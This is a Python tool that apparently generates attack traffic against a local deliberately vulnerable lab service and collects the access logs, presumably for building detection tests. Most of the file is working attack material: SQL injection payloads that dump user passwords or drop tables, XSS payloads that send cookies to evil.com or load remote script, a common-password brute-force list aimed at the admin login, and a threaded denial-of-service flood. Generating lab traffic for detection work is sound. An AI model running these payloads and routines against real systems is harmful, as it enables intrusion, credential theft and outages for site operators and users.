#!/usr/bin/env python3
"""Generate attack traffic against vulnerable_service and export collected access logs.

Usage example:
  python3 tools/attack_lab_service.py \
    --base-url http://127.0.0.1:8999 \
    --service-log vulnerable_service/logs/access.log \
    --output test_logs/lab_attack.log
"""

from __future__ import annotations

import argparse
import concurrent.futures
import os
import random
import sys
import time
from pathlib import Path
from typing import Iterable
from urllib.error import HTTPError, URLError
from urllib.parse import quote, urlencode
from urllib.request import Request, urlopen


DEFAULT_UA = "KittyHubLabAttack/1.0"

SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL --",
    "' UNION SELECT username,password,NULL,NULL,NULL,NULL FROM users --",
    "'; DROP TABLE cats; --",
    "' OR '1'='1' /*",
    "admin'--",
    "1' ORDER BY 10 --",
    "' UNION ALL SELECT NULL,sqlite_version(),NULL,NULL,NULL,NULL --",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTR(password,1,1)='a') --",
    "1; WAITFOR DELAY '0:0:5' --",
    "' UNION SELECT sql,NULL,NULL,NULL,NULL,NULL FROM sqlite_master --",
    "' AND (SELECT COUNT(*) FROM cats)>0 --",
    "') OR ('1'='1",
    "' OR 1=1 LIMIT 1 --",
    "cat' AND '1'='1",
    "' HAVING 1=1 --",
    "' GROUP BY id HAVING 1=1 --",
    "Milo' AND SUBSTR((SELECT sql FROM sqlite_master LIMIT 1),1,1)='C' --",
    "' OR name LIKE '%' --",
]

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert('xss')>",
    "javascript:alert(document.cookie)",
    "<body onload=alert('xss')>",
    "<iframe src='javascript:alert(1)'>",
    "\"><script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "'-alert(1)-'",
    "<script>fetch('http://evil.com/'+document.cookie)</script>",
    "<div style='background:url(javascript:alert(1))'>",
    "<a href=javascript:alert(1)>click</a>",
    "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",
    "{{constructor.constructor('alert(1)')()}}",
    "<object data='javascript:alert(1)'>",
    "<embed src='javascript:alert(1)'>",
    "<script src=http://evil.com/malicious.js></script>",
    "<form action='http://evil.com'><input name=q value=stolen>",
]

BRUTE_FORCE_PASSWORDS = [
    "password", "123456", "admin", "letmein", "welcome",
    "monkey", "dragon", "master", "qwerty", "login",
    "abc123", "starwars", "trustno1", "iloveyou", "shadow",
    "123123", "654321", "superman", "batman", "root",
    "toor", "pass", "test", "guest", "admin123",
    "password1", "1234567890", "000000", "football", "charlie",
    "donald", "password123", "hunter2", "access", "flower",
    "696969", "mustang", "michael", "ashley", "passw0rd",
    "computer", "jessica", "pepper", "zxcvbnm", "thomas",
    "internet", "killer", "soccer", "hockey", "ranger",
]


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Attack generator for KittyHub vulnerable service")
    parser.add_argument("--base-url", default="http://127.0.0.1:8999", help="Target service base URL")
    parser.add_argument(
        "--service-log",
        default="vulnerable_service/logs/access.log",
        help="Path to service access.log (combined format)",
    )
    parser.add_argument(
        "--output",
        default="test_logs/lab_attack.log",
        help="Destination file with logs produced by this run",
    )
    parser.add_argument("--bf-attempts", type=int, default=50, help="Failed login attempts for brute-force scenario")
    parser.add_argument("--dos-requests", type=int, default=500, help="Number of requests for DoS scenario")
    parser.add_argument("--dos-units", type=int, default=5000, help="Work units for /api/cat-feed")
    parser.add_argument("--dos-workers", type=int, default=30, help="Parallel workers for DoS scenario")
    parser.add_argument("--timeout", type=float, default=10.0, help="HTTP timeout per request")
    parser.add_argument("--user-agent", default=DEFAULT_UA, help="User-Agent marker for generated traffic")
    return parser.parse_args()


def _make_url(base_url: str, path: str, query: dict[str, str] | None = None) -> str:
    base = base_url.rstrip("/")
    if not path.startswith("/"):
        path = "/" + path
    if not query:
        return f"{base}{path}"
    return f"{base}{path}?{urlencode(query, quote_via=quote)}"


def _http_get(base_url: str, path: str, timeout: float, ua: str, query: dict[str, str] | None = None) -> int:
    url = _make_url(base_url, path, query=query)
    req = Request(url=url, method="GET", headers={"User-Agent": ua})
    try:
        with urlopen(req, timeout=timeout) as response:
            response.read()
            return int(response.status)
    except HTTPError as exc:
        exc.read()
        return int(exc.code)


def _http_post(base_url: str, path: str, timeout: float, ua: str, data: dict[str, str]) -> int:
    url = _make_url(base_url, path)
    payload = urlencode(data).encode("utf-8")
    req = Request(
        url=url,
        data=payload,
        method="POST",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": ua,
        },
    )
    try:
        with urlopen(req, timeout=timeout) as response:
            response.read()
            return int(response.status)
    except HTTPError as exc:
        exc.read()
        return int(exc.code)


def _run_sqli(base_url: str, timeout: float, ua: str) -> tuple[int, int]:
    """Run multiple SQL injection payloads."""
    success = 0
    total = len(SQLI_PAYLOADS)
    for i, payload in enumerate(SQLI_PAYLOADS):
        status = _http_get(base_url, "/cats", timeout, ua, query={"q": payload})
        if status < 500:
            success += 1
        print(f"  SQLI [{i+1}/{total}] status={status} payload={payload[:40]}")
    return success, total


def _run_xss(base_url: str, timeout: float, ua: str) -> tuple[int, int]:
    """Run multiple XSS payloads."""
    success = 0
    total = len(XSS_PAYLOADS)
    for i, payload in enumerate(XSS_PAYLOADS):
        # Some via query param, some via POST
        if i % 2 == 0:
            status = _http_get(base_url, "/community", timeout, ua, query={"note": payload})
        else:
            status = _http_post(
                base_url, "/community", timeout, ua,
                data={"author": "hacker", "message": payload},
            )
        if status < 500:
            success += 1
        print(f"  XSS  [{i+1}/{total}] status={status} payload={payload[:40]}")
    return success, total


def _run_bruteforce(base_url: str, timeout: float, ua: str, attempts: int) -> tuple[int, int]:
    failed = 0
    for idx in range(attempts):
        password = BRUTE_FORCE_PASSWORDS[idx % len(BRUTE_FORCE_PASSWORDS)]
        status = _http_post(
            base_url,
            "/account/login",
            timeout,
            ua,
            data={"username": "admin", "password": password},
        )
        if status == 401:
            failed += 1
        if (idx + 1) % 10 == 0:
            print(f"  BRUTE [{idx+1}/{attempts}] failed={failed}")
    return failed, attempts


def _dos_worker(base_url: str, timeout: float, ua: str, units: int, index: int) -> int:
    return _http_get(
        base_url,
        "/api/cat-feed",
        timeout,
        ua,
        query={"units": str(units), "burst": str(index)},
    )


def _run_dos(base_url: str, timeout: float, ua: str, requests_count: int, units: int, workers: int) -> tuple[int, int]:
    statuses: list[int] = []
    max_workers = max(1, min(workers, requests_count))
    completed = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as pool:
        futures = [
            pool.submit(_dos_worker, base_url, timeout, ua, units, idx)
            for idx in range(requests_count)
        ]
        for future in concurrent.futures.as_completed(futures):
            statuses.append(future.result())
            completed += 1
            if completed % 50 == 0:
                print(f"  DOS  [{completed}/{requests_count}]")

    ok = sum(1 for status in statuses if 200 <= status < 300)
    return ok, requests_count


def _read_new_lines(log_path: Path, offset: int) -> list[str]:
    if not log_path.exists():
        return []
    with log_path.open("r", encoding="utf-8", errors="ignore") as file_obj:
        file_obj.seek(offset)
        lines = file_obj.readlines()
    return lines


def _ensure_parent(path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)


def _wait_for_log_flush(log_path: Path, attempts: int = 8, delay_sec: float = 0.25) -> None:
    previous = -1
    stable_count = 0
    for _ in range(attempts):
        current = log_path.stat().st_size if log_path.exists() else 0
        if current == previous:
            stable_count += 1
        else:
            stable_count = 0
        previous = current
        if stable_count >= 2:
            return
        time.sleep(delay_sec)


def _print_summary(lines: Iterable[str], output: Path) -> None:
    count = sum(1 for _ in lines)
    print(f"\n[+] Collected log lines: {count}")
    print(f"[+] Output file: {output}")


def main() -> int:
    args = parse_args()

    service_log = Path(args.service_log)
    output = Path(args.output)
    _ensure_parent(output)

    start_offset = service_log.stat().st_size if service_log.exists() else 0
    print(f"[*] Target: {args.base_url}")
    print(f"[*] Starting offset in service log: {start_offset} bytes\n")

    try:
        # --- Phase 1: SQL Injection ---
        print("[PHASE 1] SQL Injection attacks")
        sqli_ok, sqli_total = _run_sqli(args.base_url, args.timeout, args.user_agent)
        print(f"[+] SQLI completed: {sqli_ok}/{sqli_total} successful\n")

        # --- Phase 2: XSS ---
        print("[PHASE 2] Cross-Site Scripting attacks")
        xss_ok, xss_total = _run_xss(args.base_url, args.timeout, args.user_agent)
        print(f"[+] XSS completed: {xss_ok}/{xss_total} successful\n")

        # --- Phase 3: Brute Force ---
        print(f"[PHASE 3] Brute Force ({args.bf_attempts} attempts)")
        failed, attempted = _run_bruteforce(args.base_url, args.timeout, args.user_agent, max(1, args.bf_attempts))
        print(f"[+] BRUTE_FORCE completed: {failed}/{attempted} failed\n")

        # --- Phase 4: DoS ---
        print(f"[PHASE 4] Denial of Service ({args.dos_requests} requests, {args.dos_workers} workers)")
        dos_ok, dos_total = _run_dos(
            args.base_url,
            args.timeout,
            args.user_agent,
            max(1, args.dos_requests),
            max(5000, args.dos_units),
            max(1, args.dos_workers),
        )
        print(f"[+] DOS completed: {dos_ok}/{dos_total} successful\n")

    except URLError as exc:
        print(f"[!] Network error: {exc}", file=sys.stderr)
        return 2
    except Exception as exc:  # pragma: no cover - defensive CLI guard
        print(f"[!] Unexpected error: {exc}", file=sys.stderr)
        return 3

    print("=" * 50)
    print(f"  SQLI:        {sqli_ok}/{sqli_total} requests")
    print(f"  XSS:         {xss_ok}/{xss_total} requests")
    print(f"  BRUTE_FORCE: {failed}/{attempted} failed logins")
    print(f"  DOS:         {dos_ok}/{dos_total} requests")
    print(f"  TOTAL:       ~{sqli_total + xss_total + attempted + dos_total} requests")
    print("=" * 50)

    _wait_for_log_flush(service_log)
    lines = _read_new_lines(service_log, start_offset)

    with output.open("w", encoding="utf-8") as file_obj:
        file_obj.writelines(lines)

    _print_summary(lines, output)
    if not lines:
        print("[!] No new log lines captured. Check service-log path and running app.", file=sys.stderr)
        return 4
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
